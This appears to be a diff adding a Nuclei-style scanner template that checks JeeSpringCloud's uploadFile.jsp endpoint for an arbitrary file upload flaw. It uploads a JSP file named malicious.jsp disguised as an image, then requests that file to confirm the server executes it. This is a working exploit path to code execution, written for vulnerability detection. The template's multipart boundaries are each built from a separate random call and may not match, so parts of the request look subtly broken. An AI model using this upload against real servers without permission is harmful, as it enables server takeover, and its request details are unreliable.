@@ -1,0 +1,47 @@
+id: jeespringcloud-uploadfile-vuln
+
+info:
+  name: JeeSpringCloud uploadFile.jsp File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    JeeSpringCloud allows arbitrary file uploads via the /static/uploadify/uploadFile.jsp endpoint, enabling attackers to upload malicious files and potentially gain control of the server.
+  tags: file-upload
+  reference:
+    - https://gitee.com/JeeHuangBingGui/jeeSpringCloud
+
+http:
+  - raw:
+      - |
+        POST /static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(16)}}
+
+        ------WebKitFormBoundary{{rand_base(16)}}\r\nContent-Disposition: form-data; name="fileshare"; filename="malicious.jsp"\r\nContent-Type: image/jpeg\r\n\r\n<% out.println("vulnerable"); %>\r\n------WebKitFormBoundary{{rand_base(16)}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "malicious.jsp"
+
+  - raw:
+      - |
+        GET /static/uploadify/malicious.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "vulnerable"
